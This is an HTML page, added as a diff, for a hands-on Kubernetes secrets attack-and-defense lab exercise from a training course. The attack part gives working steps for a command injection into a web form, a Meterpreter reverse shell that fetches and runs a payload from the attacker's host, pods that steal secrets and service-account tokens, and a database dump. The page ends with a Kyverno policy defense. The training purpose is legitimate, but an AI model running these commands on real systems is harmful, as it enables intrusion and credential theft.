@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Exercise: Kubernetes Secrets Attack and Defense | Abusing and Protecting Kubernetes, Linux and Containers</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Exercise: Kubernetes Secrets Attack and Defense" />
+<meta property="og:locale" content="en_US" />
+<link rel="canonical" href="http://0.0.0.0:10000/exercises/kubernetes-secrets-attack/" />
+<meta property="og:url" content="http://0.0.0.0:10000/exercises/kubernetes-secrets-attack/" />
+<meta property="og:site_name" content="Abusing and Protecting Kubernetes, Linux and Containers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Exercise: Kubernetes Secrets Attack and Defense" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","headline":"Exercise: Kubernetes Secrets Attack and Defense","url":"http://0.0.0.0:10000/exercises/kubernetes-secrets-attack/"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:10000/feed.xml" title="Abusing and Protecting Kubernetes, Linux and Containers" /></head>
+<body><header class="site-header">
+
+    <div class="wrapper"><a class="site-title" rel="author" href="/">Abusing and Protecting Kubernetes, Linux and Containers</a>
+
+      <nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+        <div class="trigger">
+            <a class="page-link" href="/">Exercises</a>
+            <a class="page-link" href="/about/">About</a>
+            <a class="page-link" href="/help/">Help</a>
+        </div>
+      </nav>
+
+      <!-- This is the section that comes from the default minima theme -->
+      
+    </div>
+  </header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post">
+<link rel="stylesheet" href="/assets/css/style.css">
+ <header class="post-header">
+    <h1 class="post-title">Exercise: Kubernetes Secrets Attack and Defense</h1>
+  </header>
+
+
+  <div class="post-content">
+    
+
+    <h2 id="steps">Steps</h2>
+<ol>
+<li>
+<p>Start up a fresh lxterminal by clicking the &quot;sparrow&quot; logo in the bottom-left corner of the screen, clicking run, typing <code>lxterminal</code> and hitting enter. Alternatively, use the hot key sequence below:</p>
+<pre><code>&lt;hold down Alt&gt;&lt;hit F2&gt;lxterminal&lt;HIT the enter key&gt;
+</code></pre></li>
+<li>
+<p>Start your Kubernetes cluster - we will use this one for all Kubernetes exercises except for the Cloud Attacks, Peirates and Node Attacks:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/sync/bin/suspend-all-vms.sh
+/sync/bin/start-bustakube.sh
+</code></pre></div></div>
+</li>
+<li>
+<p>SSH into the control plane node on the cluster:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-i</span> /sync/bustakube-node-key root@bustakube-controlplane
+</code></pre></div></div>
+</li>
+<li>
+<p>Activate the Secrets scenario:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/bustakube/Scenario-Secret-Attack-and-Defense/stage.sh
+</code></pre></div></div>
+</li>
+<li>
+<p>Wait for this script to finish - it takes some time, even though we're pulling from a local container registry.</p>
+</li>
+<li>
+<p>Now start a new tab by hitting <code>Ctrl-Shift-t</code>.</p>
+</li>
+<li>
+<p>Run a TCP port scan of ports 31391 and 31392 on a cluster node, until you find both ports open.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-Pn</span> <span class="nt">-sT</span> <span class="nt">-p31391</span>,31392 bustakube-node-1
+</code></pre></div></div>
+</li>
+<li>
+<p>Repeat the previous step until you find both ports 31391 and 31392 open.</p>
+</li>
+<li>
+<p>Run a TCP port scan of the control-plane node's TCP ports that are reserved for node ports:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-Pn</span> <span class="nt">-sT</span> <span class="nt">-sV</span> <span class="nt">-p30000-32767</span> bustakube-controlplane
+</code></pre></div></div>
+</li>
+<li>
+<p>Review the output - we see there are two web servers running on ports 31391 and 31392.</p>
+</li>
+<li>
+<p>Start up a Firefox browser.  You can use the icon in the top left menu bar, or use the same &quot;Run&quot; process from step 1.  Then browse to the first web application via this URL:</p>
+<p><a href="http://bustakube-controlplane:31391/">http://bustakube-controlplane:31391/</a></p>
+</li>
+<li>
+<p>Notice that you're seeing a web application that shows you flight seats purchased, with the names and ticket prices. They're all references from the movie &quot;Airplane!&quot;</p>
+</li>
+<li>
+<p>Now check out the other web application. Browse to it via this URL:</p>
+<p><a href="http://bustakube-controlplane:31392/">http://bustakube-controlplane:31392/</a></p>
+</li>
+<li>
+<p>Notice that this form appears to be an URL connectivity checker from the same fictional airline. It has with a drop-down menu, so the user can only submit a few URLs for checking. Choose one the options, like this one:</p>
+<p><a href="http://bustakube-controlplane:31392/index.php?submit=submit&amp;url=checkip.dyndns.org">http://bustakube-controlplane:31392/index.php?submit=submit&amp;url=checkip.dyndns.org</a></p>
+</li>
+<li>
+<p>Try modifying that URL right in the URL bar, appending a semicolon <code>;</code> to the <code>url</code> parameter's value. If you like, you can click this link instead:</p>
+<p><a href="http://bustakube-controlplane:31392/index.php?submit=submit&amp;url=checkip.dyndns.org%3Bid">http://bustakube-controlplane:31392/index.php?submit=submit&amp;url=checkip.dyndns.org%3Bid</a></p>
+</li>
+<li>
+<p>Notice that this form is clearly vulnerable to an injection attack and is adding our input to a shell command.  In using <code>id</code>, we've been told that the web server is running as user <code>www-data</code>.</p>
+</li>
+<li>
+<p>We could keep running commands through the browser like this, but it would be more convenient to upload a more capable command and control (C2) agent like a Meterpreter. Go back to your terminal window and start a new tab by hitting <code>Ctrl-Shift-t</code>.</p>
+</li>
+<li>
+<p>Create an ELF binary Meterpreter reverse shell with <code>msfvenom</code>, indicating that the Meterpreter should connect back to <code>10.23.58.30</code> on port <code>4444</code>.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-a</span> x86 <span class="nt">--platform</span> linux <span class="nt">-p</span> linux/x86/meterpreter/reverse_tcp <span class="se">\</span>
+  <span class="nv">LHOST</span><span class="o">=</span>10.23.58.30 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-o</span> mrsbin <span class="nt">-f</span> elf
+</code></pre></div></div>
+</li>
+<li>
+<p>Stage a simple web server on port <code>80</code> to serve this file:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 80
+</code></pre></div></div>
+</li>
+<li>
+<p>Next you'll set up a Metasploit console that can receive an inbound connection from this Meterpreter. Start up a new terminal tab by hitting <code>Ctrl-Shift-t</code>.</p>
+</li>
+<li>
+<p>Start up a Metasploit console:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfconsole
+</code></pre></div></div>
+</li>
+<li>
+<p>Set up a <code>multi/handler</code> to catch the shell.  Start by specifying <code>exploit/multi/handler</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/multi/handler
+</code></pre></div></div>
+</li>
+<li>
+<p>Set the handler to catch the corresponding payload to the one we specified in our <code>msfvenom</code> line:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">set </span>payload linux/x86/meterpreter/reverse_tcp
+</code></pre></div></div>
+</li>
+<li>
+<p>Set the receiving host to <code>10.23.58.30</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">set </span>LHOST 10.23.58.30
+</code></pre></div></div>
+</li>
+<li>
+<p>Set <code>ExitOnSession</code> to <code>false</code>, so the handler can catch multiple incoming reverse shell connections:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">set </span>ExitOnSession <span class="nb">false</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now start the handler as a background job:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exploit <span class="nt">-j</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Go back to your browser and change the <code>id</code> command in the URL bar into the following, so the target container will request the <code>mrsbin</code> binary from our web server, then hit the submit button:</p>
+<pre><code>curl -o /tmp/mrsbin http://10.23.58.30/mrsbin
+</code></pre></li>
+<li>
+<p>Now change the command in the URL bar to this one, so the target container will make the <code>mrsbin</code> binary executable and run it, and then hit the submit button:</p>
+<pre><code>chmod 755 /tmp/mrsbin ; /tmp/mrsbin
+</code></pre></li>
+<li>
+<p>Go check your Metasploit console. You should now see a line that reads something like &quot;Meterpreter session 1 opened…&quot;</p>
+</li>
+<li>
+<p>Interact with this new session:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sessions <span class="nt">-i</span> 1
+</code></pre></div></div>
+</li>
+<li>
+<p>Upload a copy of kubectl:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>upload /root/K8S-Exercise/kubectl
+</code></pre></div></div>
+</li>
+<li>
+<p>Instruct Meterpreter to give you a minimal interactive shell. You won't get any immediate feedback from the system, just a &quot;Process … created&quot; and &quot;Channel … created&quot; line from Metasploit.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shell
+</code></pre></div></div>
+</li>
+<li>
+<p>Make the shell more interactive by starting a bash process with the <code>-i</code> flag:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-i</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Make the <code>kubectl</code> binary you just uploaded executable:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod </span>755 kubectl
+</code></pre></div></div>
+</li>
+<li>
+<p>Set up a <code>kubectl</code> alias to use the existing cluster token:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">DIR</span><span class="o">=</span><span class="s1">'/var/run/secrets/kubernetes.io/serviceaccount/'</span>
+<span class="nb">alias </span><span class="nv">kubectl</span><span class="o">=</span><span class="s2">"</span><span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span><span class="s2">/kubectl --token=</span><span class="si">$(</span><span class="nb">cat</span> <span class="nv">$DIR</span>/token<span class="si">)</span><span class="s2"> </span><span class="se">\</span><span class="s2">
+--certificate-authority=</span><span class="nv">$DIR</span><span class="s2">/ca.crt </span><span class="se">\</span><span class="s2">
+--server=https://kubernetes.default.svc.cluster.local:443"</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Check to see what privileges your user has in this pod:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl auth can-i <span class="nt">--list</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that you are permitted to list and even create pods. Look for a line that starts with <code>pods</code> and ends with <code>[get list watch create]</code>.</p>
+</li>
+<li>
+<p>List the pods in this namespace:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get pods
+</code></pre></div></div>
+</li>
+<li>
+<p>It looks like the pod that showed us the ticket sales is called <code>view-seat-sales</code>. Use <code>kubectl describe</code> to get a human-friendly description of the pod:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl describe pod view-seat-sales
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that the <code>Environment</code> section says that this pod gets an environment variable called <code>PASSWORD</code> populated from the <code>password</code> key in the <code>transactions-secret</code> secret. It's similar for the <code>USER</code> environment variable.</p>
+</li>
+<li>
+<p>Notice that the <code>Environment</code> section also says this pod gets an environment variable called <code>DBHOST</code> populated from the <code>dbhost</code> key in the <code>transactions-cm</code> configMap.</p>
+</li>
+<li>
+<p>Look at the pod's manifest in YAML format to see how you can create pods that do this with their environment variables. Use the <code>grep</code> flag <code>-A</code> to see 10 lines <strong>after</strong> the matched line:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get pod view-seat-sales <span class="nt">-o</span> yaml | <span class="nb">grep</span> <span class="nt">-A</span> 10 <span class="nb">env</span>:
+</code></pre></div></div>
+</li>
+<li>
+<p>Think about this - anyone who can start a pod in a namespace is able to have any secret in that namespace placed into their pod as an environment variable. We can use this to steal these database credentials.</p>
+</li>
+<li>
+<p>Create a pod from the <code>bustakube/http-display-env-variables</code> image. This image runs a simple web server that displays any environment variables it has. You'll have this pod populate its <code>USER</code> and <code>PASSWORD</code> variables with the same secret that the <code>view-seat-sales</code> pod uses.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> <span class="o">&lt;&lt;</span><span class="no">END</span><span class="sh"> &gt;pod-steal-secret.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  labels:
+    run: eve
+  name: eve
+spec:
+  containers:
+  - image: bustakube/http-display-env-variables
+    name: eve
+    env:
+    - name: USER
+      valueFrom:
+        secretKeyRef:
+          name: transactions-secret
+          key: user
+    - name: PASSWORD
+      valueFrom:
+        secretKeyRef:
+          name: transactions-secret
+          key: password
+    - name: DBHOST
+      valueFrom:
+        configMapKeyRef:
+          name: transactions-cm
+          key: dbhost
+</span><span class="no">END
+</span></code></pre></div></div>
+</li>
+<li>
+<p>Create this new pod:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl create <span class="nt">-f</span> pod-steal-secret.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, let's get that pod's IP address. First, use <code>kubectl get pod</code> to see the pod's manifest and all its status:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get pod eve <span class="nt">-o</span> yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, use <code>grep</code> to just get the <code>podIP</code> line:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get pod eve <span class="nt">-o</span> yaml | <span class="nb">grep </span>podIP:
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, parse that IP and place it in a variable called <code>ip</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">ip</span><span class="o">=</span><span class="si">$(</span>kubectl get pod eve <span class="nt">-o</span> yaml | <span class="nb">grep </span>podIP: | <span class="nb">awk</span> <span class="s1">'{print $2}'</span><span class="si">)</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Run a <code>curl</code> command to connect to that pod and see the environment variables it received.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  curl <span class="nt">-s</span> http://<span class="nv">$ip</span>:8080
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's grab just the <code>PASSWORD</code> line from that output:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> http://<span class="nv">$ip</span>:8080 | <span class="nb">grep </span>PASSWORD
+</code></pre></div></div>
+</li>
+<li>
+<p>Parse that password into a variable:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">PASSWORD</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-s</span> http://<span class="nv">$ip</span>:8080 | <span class="nb">grep </span>PASSWORD | <span class="nb">awk</span> <span class="s1">'{print $3}'</span><span class="si">)</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now do the same with the <code>USER</code> environment variable.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">USER</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-s</span> http://<span class="nv">$ip</span>:8080 | <span class="nb">grep </span>USER | <span class="nb">awk</span> <span class="s1">'{print $3}'</span><span class="si">)</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now try connecting to the PostgreSQL database using the username and password you gathered. First, set a variable to the server name:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">DB</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-s</span> http://<span class="nv">$ip</span>:8080 | <span class="nb">grep </span>DBHOST | <span class="nb">awk</span> <span class="s1">'{print $3}'</span><span class="si">)</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Connect to the database:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">PGPASSWORD</span><span class="o">=</span><span class="nv">$PASSWORD</span>
+psql <span class="nt">--host</span> <span class="nv">$DB</span> <span class="nt">-U</span> <span class="nv">$USER</span> <span class="nt">-d</span> app_db <span class="nt">-p</span> 5432
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, view the databases:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="se">\l</span>ist
+</code></pre></div></div>
+</li>
+<li>
+<p>Use the transactions database:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="se">\c</span>onnect transactions
+</code></pre></div></div>
+</li>
+<li>
+<p>List the tables:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="se">\d</span>t
+</code></pre></div></div>
+</li>
+<li>
+<p>Finally, read the contents of the <code>transactions</code> table:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">*</span> from transactions<span class="p">;</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that we now see all the transaction details, including credit card numbers!</p>
+</li>
+<li>
+<p>Exit the PostgreSQL client:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="se">\q</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's look at one other gotcha for secrets. This time, let's start a pod to steal a service account token in the same namespace. Take a look at what service account the other pod in the cluster, called <code>jenkins</code>, uses:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl get pod jenkins <span class="nt">-o</span> yaml | <span class="nb">grep </span>serviceAccount:
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, let's see what that service account can do.  Create your own pod manifest, naming that service account as the one you'd like to use.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> <span class="o">&lt;&lt;</span><span class="no">END</span><span class="sh"> &gt;pod-display-token.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: display-token
+spec:
+  containers:
+  - image: bustakube/http-display-sa-token
+    name: display-token
+  dnsPolicy: ClusterFirst
+  restartPolicy: Always
+  serviceAccount: jenkins
+</span><span class="no">END
+</span></code></pre></div></div>
+</li>
+<li>
+<p>Now, stage the pod:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl create <span class="nt">-f</span> pod-display-token.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Get the pod's IP address:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="nv">p</span><span class="o">=</span><span class="s2">"display-token"</span>
+<span class="nv">ip</span><span class="o">=</span><span class="si">$(</span> kubectl get po <span class="nv">$p</span> <span class="nt">-o</span> yaml |grep podIP: |awk <span class="s1">'{print $2}'</span><span class="si">)</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, connect to the pod with <code>curl</code> to receive the token:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> http://<span class="nv">$ip</span>:8080 <span class="o">&gt;</span>token
+</code></pre></div></div>
+</li>
+<li>
+<p>Display the token file:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>token
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, let's see what that token can do!</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nt">--token</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>token<span class="si">)</span> auth can-i <span class="nt">--list</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that the token is allowed to list secrets, but isn't allowed to retrieve any secrets.</p>
+</li>
+<li>
+<p>Try listing secrets in this namespace.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nt">--token</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>token<span class="si">)</span> get secrets
+</code></pre></div></div>
+</li>
+<li>
+<p>Now, time for the unintended side effect that has burned a number of defenders. Append a <code>-o yaml</code> to that last command to see the contents of every secret!</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nt">--token</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>token<span class="si">)</span> get secrets <span class="nt">-o</span> yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that you can see the contents of all the secrets in this namespace. They're base64-encoded, but that's easy enough to deal with.</p>
+</li>
+<li>
+<p>Let's examine one of the secrets in that dump. Take a look at the base64-encoded version of the transaction-secrets secret's password key.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nt">--token</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>token<span class="si">)</span> get secrets <span class="nt">-o</span> yaml | <span class="se">\</span>
+  <span class="nb">grep</span> <span class="nt">-B</span> 10 <span class="s1">'name: transactions-secret'</span> | <span class="nb">grep </span>password
+</code></pre></div></div>
+</li>
+<li>
+<p>Grab the right hand side and base64 decode it:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nt">--token</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>token<span class="si">)</span> get secrets <span class="nt">-o</span> yaml | <span class="se">\</span>
+  <span class="nb">grep</span> <span class="nt">-B</span> 10 <span class="s1">'name: transactions-secret'</span> | <span class="se">\</span>
+  <span class="nb">grep </span>password | <span class="nb">awk</span> <span class="s1">'{print $2}'</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="p">;</span> <span class="nb">echo</span> <span class="s2">""</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Let's look at an admission controller called <a href="https://kyverno.io/">Kyverno</a>. Start another terminal tab by hitting <code>Ctrl-shift-t</code>.</p>
+</li>
+<li>
+<p>Connect to the control plane node as the <code>bustakube</code> user using the password <code>bustakube</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh bustakube@bustakube-controlplane
+bustakube
+</code></pre></div></div>
+</li>
+<li>
+<p>Run sudo su - to elevate to <code>root</code>, using the password <code>bustakube</code>:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>su -
+bustakube
+</code></pre></div></div>
+</li>
+<li>
+<p>Add the Kyverno Helm repository to Helm:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>helm repo add kyverno https://kyverno.github.io/kyverno/
+</code></pre></div></div>
+</li>
+<li>
+<p>Refresh the Helm repository:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>helm repo update
+</code></pre></div></div>
+</li>
+<li>
+<p>Install Kyverno into its own namespace:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>helm <span class="nb">install </span>kyverno kyverno/kyverno <span class="nt">-n</span> kyverno <span class="nt">--create-namespace</span> <span class="se">\</span>
+<span class="nt">--set</span> <span class="nv">replicaCount</span><span class="o">=</span>1
+</code></pre></div></div>
+</li>
+<li>
+<p>Demonstrate to yourself that the <code>jenkins</code> service account is permitted to list secrets:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nt">--as</span><span class="o">=</span>system:serviceaccount:default:jenkins get secrets
+</code></pre></div></div>
+</li>
+<li>
+<p>Pull down the <code>restrict-secret-role-verbs</code> Kyverno cluster policy manifest:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="nv">url</span><span class="o">=</span><span class="s2">"https://raw.githubusercontent.com/kyverno/policies/main/other/res"</span>
+curl <span class="nt">-LO</span> <span class="s2">"</span><span class="k">${</span><span class="nv">url</span><span class="k">}</span><span class="s2">/restrict-secret-role-verbs/restrict-secret-role-verbs.yaml"</span>
+</code></pre></div></div>
+</li>
+<li>
+<p>Kyverno cluster policies are in <code>audit</code> mode by default, where they alert on a violation of the policy, but do not block it. Modify this manifest to change the <code>validationFailureAction</code> to <code>enforce</code>.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s/audit/enforce/'</span> restrict-secret-role-verbs.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Delete the <code>list-secrets</code> role from the default namespace:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl delete role list-secrets
+</code></pre></div></div>
+</li>
+<li>
+<p>Activate the policy:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl create <span class="nt">-f</span> restrict-secret-role-verbs.yaml
+</code></pre></div></div>
+</li>
+<li>
+<p>Try to recreate the role:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl create role list-secrets <span class="nt">--verb</span><span class="o">=</span>list <span class="nt">--resource</span><span class="o">=</span>secrets
+</code></pre></div></div>
+</li>
+<li>
+<p>Notice that Kyverno has blocked the role's creation. Here's the output from the last command on our test system</p>
+<pre><code>Error from server: admission webhook &quot;validate.kyverno.svc-fail&quot; denied the request:
+
+resource Role/default/list-secrets was blocked due to the following policies
+
+restrict-secret-role-verbs:
+  secret-verbs: Requesting verbs `get`, `list`, or `watch` on Secrets is forbidden.
+</code></pre></li>
+<li>
+<p>Now, delete the <code>restrict-secret-role-verbs</code> cluster policy:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl delete clusterpolicy.kyverno.io/restrict-secret-role-verbs
+</code></pre></div></div>
+</li>
+<li>
+<p>Attempt to create the <code>list-secrets</code> role again. You should find it possible again.</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl create role list-secrets <span class="nt">--verb</span><span class="o">=</span>list <span class="nt">--resource</span><span class="o">=</span>secrets
+</code></pre></div></div>
+</li>
+<li>
+<p>List secrets using the recreated role:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kubectl <span class="nt">--as</span><span class="o">=</span>system:serviceaccount:default:jenkins get secrets
+</code></pre></div></div>
+</li>
+<li>
+<p>Uninstall the Kyverno admission controller via Helm:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>helm <span class="nt">-n</span> kyverno uninstall kyverno
+</code></pre></div></div>
+</li>
+</ol>
+
+  </div>
+
+  <div class="post-exercise">
+    <h2 id="exercise-done">Done With the Exercise</h2>
+
+<p>Please flip your sticker over so we know how many people are done with the exercise.</p>
+</p>
+    
+
+
+    <h2 id="suspend-vms">Virtual Machine Management Tips</h2>
+
+<p> If you want to see what virtual machines are currently running, you can run:</p>
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  virsh list  
+</code></pre></div>    </div>
+    
+<p>If you have virtual machines using RAM and CPU, you can suspend all of them with:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  sudo /sync/bin/suspend-all-vms.sh 
+</code></pre></div>    </div>
+
+    
+
+  </div>
+
+</article>
+<script src="/assets/scripts/clipboard.min.js"></script>
+<script src="/assets/scripts/copy.js"></script>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Abusing and Protecting Kubernetes, Linux and Containers</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Abusing and Protecting Kubernetes, Linux and Containers</li><li><a class="u-email" href="mailto:contact@inguardians.com">contact@inguardians.com</a></li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/inguardians"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">inguardians</span></a></li><li><a href="https://www.twitter.com/inguardians"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">inguardians</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p></p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
